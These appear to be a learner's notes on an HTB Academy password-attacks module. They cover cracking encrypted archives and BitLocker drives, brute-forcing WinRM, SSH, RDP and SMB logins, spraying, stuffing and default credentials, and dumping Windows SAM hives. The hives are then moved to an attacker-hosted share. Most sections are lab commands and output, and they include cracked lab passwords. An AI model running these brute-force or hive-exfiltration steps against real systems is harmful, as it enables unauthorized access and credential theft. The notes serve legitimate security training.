The following one-liner may produce several GZIP-related error messages, which can be safely ignored. If the correct password list is used, as in this example, we will see another file successfully extracted from the archive.

```bash
mdn0x@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

Once the `for` loop has finished, we can check the current directory for a newly extracted file.
### Cracking BitLocker-encrypted drives

[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-device-encryption-overview-windows-10) is a full-disk encryption feature developed by Microsoft for the Windows operating system. Available since Windows Vista, it uses the `AES` encryption algorithm with either 128-bit or 256-bit key lengths. If the password or PIN used for BitLocker is forgotten, decryption can still be performed using a recovery key—a 48-digit string generated during the setup process.

In enterprise environments, virtual drives are sometimes used to store personal information, documents, or notes on company-issued devices to prevent unauthorized access. To crack a BitLocker encrypted drive, we can use a script called `bitlocker2john` to [four different hashes](https://openwall.info/wiki/john/OpenCL-BitLocker): the first two correspond to the BitLocker password, while the latter two represent the recovery key. Because the recovery key is very long and randomly generated, it is generally not practical to guess—unless partial knowledge is available. Therefore, we will focus on cracking the password using the first hash (`$bitlocker$0$...`).

```bash
mdn0x@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
mdn0x@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
mdn0x@htb[/htb]$ cat backup.hash
```

Once a hash is generated, either `JtR` or `hashcat` can be used to crack it. For this example, we will look at the procedure with `hashcat`. The hashcat mode associated with the `$bitlocker$0$...` hash is `-m 22100`. We supply the hash, specify the wordlist, and define the hash mode. Since this encryption uses strong AES encryption, cracking may take considerable time depending on hardware performance.

```bash
mdn0x@htb[/htb]$ hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
```

After successfully cracking the password, we can access the encrypted drive.
#### Mounting BitLocker-encrypted drives in Linux (or macOS)

It is also possible to mount BitLocker-encrypted drives in Linux (or macOS). To do this, we can use a tool called [dislocker](https://github.com/Aorimn/dislocker). First, we need to install the package using `apt`:

```bash
mdn0x@htb[/htb]$ sudo apt-get install dislocker
```

Next, we create two folders which we will use to mount the VHD.

```bash
mdn0x@htb[/htb]$ sudo mkdir -p /media/bitlocker
mdn0x@htb[/htb]$ sudo mkdir -p /media/bitlockermount
```

We then use `losetup` to configure the VHD as [loop device](https://en.wikipedia.org/wiki/Loop_device), decrypt the drive using `dislocker`, and finally mount the decrypted volume:

```bash
mdn0x@htb[/htb]$ sudo losetup -f -P Backup.vhd
mdn0x@htb[/htb]$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
mdn0x@htb[/htb]$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

If everything was done correctly, we can now browse the files:

```bash
mdn0x@htb[/htb]$ cd /media/bitlockermount/
mdn0x@htb[/htb]$ ls -la
```

Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:

```bash
mdn0x@htb[/htb]$ sudo umount /media/bitlockermount
mdn0x@htb[/htb]$ sudo umount /media/bitlocker
```
### Exercise

Run the above target then navigate to http://ip:port/download, then extract the downloaded file. Inside, you will find a password-protected VHD file. Crack the password for the VHD and submit the recovered password as your answer.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ unzip cracking-protected-archives.zip Private.vhd               
Archive:  cracking-protected-archives.zip
  inflating: Private.vhd 
  
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ bitlocker2john -i Private.vhd > vhd.hashes

Signature found at 0x10003
Version: 8 
Invalid version, looking for a signature with valid version...

Signature found at 0x2200000
Version: 2 (Windows 7 or later)

VMK entry found at 0x22000ba

VMK encrypted with User Password found at 22000dc
VMK encrypted with AES-CCM

VMK entry found at 0x220019a

VMK encrypted with Recovery Password found at 0x22001bc
Searching AES-CCM from 0x22001d8
Trying offset 0x220026b....
VMK encrypted with AES-CCM!!

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ grep "bitlocker\$0" vhd.hashes > vhd.hash
                                                                                                       
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ cat vhd.hash 
$bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$1048576$12$b020fe18bbb1db0103000000$60$e9c6b548788aeff190e517b0d85ada5daad7a0a3f40c4467307011ac17f79f8c99768419903025fd7072ee78b15a729afcf54b8c2e3af05bb18d4ba0

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ john --format=BitLocker vhd.hash 

francisco     (?)

┌──(mdn0x㉿mdn0xKali)-[/run/media/mdn0x/New Volume]
└─$ cat flag.txt 
HTB{{REDACTED_FLAG}}
```

---
# Remote Password Attacks
## Network Services

During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to) `FTP`, `SMB`, `NFS`, `IMAP/POP3`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP`.

For further reading on many of these services, check out the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) module on HTB Academy.

Let us imagine that we want to manage a Windows server over the network. Accordingly, we need a service that allows us to access the system, execute commands on it, or access its contents via a GUI or the terminal. In this case, the most common services suitable for this are `RDP`, `WinRM`, and `SSH`. SSH is not as common on Windows, but it is the leading service for Linux-based systems.

All these services have an authentication mechanism using a username and password. Of course, these services can be modified and configured so that only predefined keys can be used for logging in, but they are configured with default settings in many cases.
### WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

For security reasons, WinRM must be activated and configured manually in Windows 10/11. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. By default, WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).

A handy tool that we can use for our password attacks is [NetExec](https://github.com/Pennyw0rth/NetExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the [official documentation](https://www.netexec.wiki/) for this tool to become familiar with it.
### NetExec

We can install [[NetExec]] with `apt`, or clone the [GitHub repo](https://github.com/Pennyw0rth/NetExec) and follow the various [installation](https://www.netexec.wiki/getting-started/installation) methods, such as installing from source and avoiding dependency issues.

Running the tool with the `-h` flag will show us general usage instructions and some options available to us.

Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.

```bash
mdn0x@htb[/htb]$ netexec smb -h
```

The general format for using NetExec is as follows:

```
mdn0x@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
### Evil-WinRM

Another handy tool that we can use to communicate with the WinRM service is [[Evil-WinRM]], which allows us to communicate with the `WinRM` service efficiently.


```bash
mdn0x@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.
### SSH

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

**Symmetric Encryption**

Symmetric encryption uses the `same key` for encryption and decryption. Anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The [Diffie-Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.

**Asymmetric Encryption**

Asymmetric encryption uses `two keys`: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.

**Hashing**

The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

We can use a tool like [[Hydra]] to brute force [[SSH]]. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.

```
mdn0x@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
```

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.  `mdn0x@htb[/htb]$ ssh user@10.129.42.197`
### Remote Desktop Protocol (RDP)

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) ([[RDP]]) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.

We can also use `Hydra` to perform RDP bruteforcing. 

```
mdn0x@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
```

Linux offers different clients to communicate with the desired server using the RDP protocol. These include [Remmina](https://remmina.org/), [xfreerdp](https://linux.die.net/man/1/xfreerdp), and many others. For our purposes, we will work with [[XfreeRDP3]]

```
xfreerdp3 /v:<target-IP> /u:<username> /p:<password>.
```
### SMB

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) ([[SMB]]) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter [Samba](https://wiki.samba.org/index.php/Main_Page), which is an open-source implementation of the above functions. For SMB, we can also use [[Hydra]] again to try different usernames in combination with different passwords.

```
mdn0x@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```

However, we may also get the following error describing that the server has sent an invalid reply.

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the [[Metasploit-Framework (MSF)]].

```
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run
```

Now we can use [[NetExec]] again to view the available shares and what privileges we have for them.

```
mdn0x@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

[[SMBclient]]

```
mdn0x@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```
### Exercise

1. Find the user for the WinRM service and crack their password. Then, when you log in, you will find the [[Flag]] in a file there. Submit the flag you found as the answer.

10.129.195.165

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ unzip 3c72cefc-4d6a-413d-ad3e-395431df28bc.zip   
Archive:  3c72cefc-4d6a-413d-ad3e-395431df28bc.zip
  inflating: username.list           
  inflating: password.list 
  

─$ netexec winrm target.htb -u username.list -p password.list
[*] Adding missing option 'check_guest_account' in config section 'nxc' to nxc.conf
[*] Adding missing section 'BloodHound-CE' to nxc.conf
[*] Adding missing option 'bhce_enabled' in config section 'BloodHound-CE' to nxc.conf
WINRM       10.129.42.197   5985   SHELLS-WINSVR    [*] Windows 10 / Server 2019 Build 17763 (name:SHELLS-WINSVR) (domain:shells-winsvr) 
<SNIP>
WINRM       10.129.195.165  5985   WINSRV           [-] WINSRV\audit4:princess
WINRM       10.129.195.165  5985   WINSRV           [-] WINSRV\audit3:princess
WINRM       10.129.195.165  5985   WINSRV           [-] WINSRV\audit2:princess
WINRM       10.129.195.165  5985   WINSRV           [-] WINSRV\archive:princess
WINRM       10.129.195.165  5985   WINSRV           [-] WINSRV\adc:princess
WINRM       10.129.195.165  5985   WINSRV           [-] WINSRV\accountspayable:princess
WINRM       10.129.195.165  5985   WINSRV           [-] WINSRV\:princess
WINRM       10.129.195.165  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)


─$ evil-winrm -u 'john' -p 'november' -i target.htb

cat*Evil-WinRM* PS C:\Users\john\Desktop> cat flag.txt
HTB{{REDACTED_FLAG}}
```


2. Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ hydra -L username.list -P password.list ssh://target.htb
[22][ssh] host: target.htb   login: dennis   password: rockstar

─$ ssh dennis@target.htb 

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{{REDACTED_FLAG}}
```

3. Find the user for the [[RDP]] service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ hydra -L username.list -P password.list target.htb rdp
[3389][rdp] host: target.htb   login: chris   password: 789456123

─$ xfreerdp3 /u:chris /p:789456123 /v:target.htb
HTB{{REDACTED_FLAG}}
```

4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(scanner/smb/smb_login) > set user_file username.list
msf auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf auxiliary(scanner/smb/smb_login) > set rhosts 10.129.195.165
msf auxiliary(scanner/smb/smb_login) > run

[+] 10.129.195.165:445    - 10.129.195.165:445    - Success: '.\dennis:rockstar'
[+] 10.129.195.165:445    - 10.129.195.165:445    - Success: '.\john:november'

[+] 10.129.195.165:445    - 10.129.195.165:445    - Success: '.\chris:789456123'
[+] 10.129.195.165:445    - 10.129.195.165:445    - Success: '.\cassie:12345678910'


└─$ netexec smb 10.129.195.165 -u "chris" -p "789456123" --shares
[*] Initializing SMB protocol database
SMB         10.129.195.165  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:True) (SMBv1:None)
SMB         10.129.195.165  445    WINSRV           [+] WINSRV\chris:789456123 
SMB         10.129.195.165  445    WINSRV           [*] Enumerated shares
SMB         10.129.195.165  445    WINSRV           Share           Permissions     Remark
SMB         10.129.195.165  445    WINSRV           -----           -----------     ------
SMB         10.129.195.165  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.195.165  445    WINSRV           C$                              Default share
SMB         10.129.195.165  445    WINSRV           CASSIE                          
SMB         10.129.195.165  445    WINSRV           IPC$            READ            Remote IPC

└─$smbclient -U cassie \\\\target.htb\\CASSIE
smb: \> get flag.txt                                                                          
getting file \flag.txt of size 16 as flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec) 

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ cat flag.txt     
HTB{{REDACTED_FLAG}}
```
## Spraying, Stuffing & Defaults

### Password spraying

[Password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack) is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use `ChangeMe123!` when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.

Depending on the target system, different tools may be used to carry out password spraying attacks. For web applications, [Burp Suite](https://portswigger.net/burp) is a strong option, while for Active Directory environments, tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) or [Kerbrute](https://github.com/ropnop/kerbrute) are commonly used.

```bash
mdn0x@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
### Credential stuffing

[Credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms (such as email, social media, and enterprise systems), these attacks are sometimes successful. As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system. For example, if we have a list of `username:password` credentials obtained from a database leak, we can use `hydra` to perform a credential stuffing attack against an SSH service using the following syntax:

```bash
mdn0x@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```
### Default credentials

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), which we can install with `pip3`.

```bash
mdn0x@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```

Once installed, we can use the `creds` command to search for known default credentials associated with a specific product or vendor.

```bash
mdn0x@htb[/htb]$ creds search linksys
```

In addition to publicly available lists and tools, default credentials can often be found in product documentation, which typically outlines the steps required to set up a service. While some devices and applications prompt the user to set a password during installation, others use a default—often weak—password.

Let's imagine we have identified certain applications in use on a customer's network. After researching the default credentials online, we can combine them into a new list, formatted as `username:password`, and reuse the previously mentioned `hydra` command to attempt access.

Beyond applications, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/).While it is less likely that router credentials remain unchanged (since these devices are critical to network security), oversights do occur. Routers used in internal testing environments, for example, may be left with default settings and can be exploited to gain further access.

| **Router Brand** | **Default IP Address**                       | **Default Username** | **Default Password** |
| ---------------- | -------------------------------------------- | -------------------- | -------------------- |
| 3Com             | [http://192.168.1.1](http://192.168.1.1)     | admin                | Admin                |
| Belkin           | [http://192.168.2.1](http://192.168.2.1)     | admin                | admin                |
| BenQ             | [http://192.168.1.1](http://192.168.1.1)     | admin                | Admin                |
| D-Link           | [http://192.168.0.1](http://192.168.0.1)     | admin                | Admin                |
| Digicom          | [http://192.168.1.254](http://192.168.1.254) | admin                | Michelangelo         |
| Linksys          | [http://192.168.1.1](http://192.168.1.1)     | admin                | Admin                |
| Netgear          | [http://192.168.0.1](http://192.168.0.1)     | admin                | password             |
| Sitecom          | http://192.168.0.1                           | sitecom              | Admin                |
## Exercise

Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ ssh sam@target.htb 

sam@nix01:~/smb$ cat flag.txt 
HTB{{REDACTED_FLAG}}

sam@nix01:/home/kira/Documents$ ls
Notes.zip

sam@nix01:/home/kira/Documents$ python3 -m http.server 8080

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ unzip Notes.zip                               
Archive:  Notes.zip
[Notes.zip] notes.txt password:


┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ zip2john Notes.zip > zip.hash
ver 1.0 efh 5455 efh 7875 Notes.zip/notes.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=D0CED23B ts=7EF8 cs=7ef8 type=0
Note: It is normal for some outputs to be very large

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ john zip.hash 
```

Not meant to crack, try to look at default credentials for [[MySQL]]:

```bash
─$ pipx install defaultcreds-cheat-sheet

─$ creds search mysql
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql (ssh)         |        root       |   root   |
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+

sam@nix01:~$ mysql --user=superdba --password=admin
mysql> 
```


---
# Extracting Password From Windows Systems
## Windows Authentication Process

The [Windows client authentication process](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) involves multiple modules responsible for logon, credential retrieval, and verification. Among the various authentication mechanisms in Windows, Kerberos is one of the most widely used and complex. The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (SIDs).

The security subsystem maintains security policies and user accounts on a computer system. On a Domain Controller, these policies and accounts apply to the entire domain and are stored in Active Directory. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.

Local interactive logon is handled through the coordination of several components: the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8)), the logon user interface process (`LogonUI`), credential providers, the Local Security Authority Subsystem Service (`LSASS`), one or more authentication packages, and either the Security Accounts Manager (`SAM`) or Active Directory. Authentication packages, in this context, are Dynamic-Link Libraries (DLLs) responsible for performing authentication checks. For example, for non-domain-joined and interactive logins, the `Msv1_0.dll` authentication package is typically used.

`WinLogon` is a trusted system process responsible for managing security-related user interactions, such as:

- Launching `LogonUI` to prompt for credentials at login
- Handling password changes
- Locking and unlocking the workstation

To obtain a user's account name and password, WinLogon relies on credential providers installed on the system. These credential providers are `COM` objects implemented as DLLs.

WinLogon is the only process that intercepts login requests from the keyboard, which are sent via RPC messages from `Win32k.sys`. At logon, it immediately launches the `LogonUI` application to present the graphical user interface. Once the user's credentials are collected by the credential provider, WinLogon passes them to the Local Security Authority Subsystem Service (`LSASS`) to authenticate the user.

### LSASS

The [Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is comprised of multiple modules and governs all authentication processes. Located at `%SystemRoot%\System32\Lsass.exe` in the file system, it is responsible for enforcing the local security policy, authenticating users, and forwarding security audit logs to the `Event Log`. In essence, LSASS serves as the gatekeeper in Windows-based operating systems. A more detailed illustration of the LSASS architecture can be found [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760\(v=technet.10\)?redirectedfrom=MSDN).

| **Authentication Packages** | **Description**                                                                                                                                                                                                                                                |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`                | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`                | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`                | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll`              | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll`              | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`                 | Directory System Agent (DSA) that manages the Active Directory database (ntds.dit), processes LDAP queries, and handles replication between domain controllers. Only loaded on Domain Controllers.                                                             |

Source: [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication).

Each interactive logon session creates a separate instance of the WinLogon service. The [Graphical Identification and Authentication](https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) (`GINA`) architecture is loaded into the process area used by WinLogon, receives and processes the credentials, and invokes the authentication interfaces via the [LSALogonUser](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.

### SAM database

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748\(v=ws.10\)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores user account credentials. It is used to authenticate both local and remote users and uses cryptographic protections to prevent unauthorized access. User passwords are stored as hashes in the registry, typically in the form of either `LM` or `NTLM` hashes. The SAM file is located at `%SystemRoot%\system32\config\SAM` and is mounted under `HKLM\SAM`. Viewing or accessing this file requires `SYSTEM` level privileges.

Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\NTDS\ntds.dit`.

To improve protection against offline cracking of the SAM database, Microsoft introduced a feature in Windows NT 4.0 called `SYSKEY` (`syskey.exe`). When enabled, SYSKEY partially encrypts the SAM file on disk, ensuring that password hashes for all local accounts are encrypted with a system-generated key.
### Credential Manager

Credential Manager is a built-in feature of all Windows operating systems that allows users to store and manage credentials used to access network resources, websites, and applications. These saved credentials are stored per user profile in the user's `Credential Locker`. The credentials are encrypted and stored at the following location:
```bash
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```
There are various methods to decrypt credentials saved using Credential Manager. We will practice hands-on with some of these methods in this module.
### NTDS

It is very common to encounter network environments where Windows systems are joined to a Windows domain. This setup simplifies centralized management, allowing administrators to efficiently oversee all systems within their organization. In such environments, logon requests are sent to Domain Controllers within the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit`, which is synchronized across all Domain Controllers, with the exception of [Read-Only Domain Controllers (RODCs)](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema).

`NTDS.dit` is a database file that stores Active Directory data, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

Later in this module, we will explore methods for extracting credentials from the `NTDS.dit` file.

Now that we have gone through a primer on credential storage concepts, let's study the various attacks we can perform to extract credentials and further our access during assessments.

## Attacking SAM, SYSTEM, and SECURITY

With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box provided in this section.
### Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|

We can back up these hives using the `reg.exe` utility.
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:


```powershell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully. 
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save 
The operation completed successfully. 
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save 
The operation completed successfully.
```

If we're only interested in dumping the hashes of local users, we need only `HKLM\SAM` and `HKLM\SYSTEM`. However, it's often useful to save `HKLM\SECURITY` as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Once these hives are saved offline, we can use various methods to transfer them to our attack host. In this case, we'll use Impacket's [smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some basic CMD commands to move the hive copies to a share hosted on our attacker machine.
#### Creating a share with smbserver

To create the share, we simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`). The `-smb2support` flag ensures compatibility with newer versions of SMB. If we do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to [numerous severe vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.

```bash
mdn0x@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

```bash
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
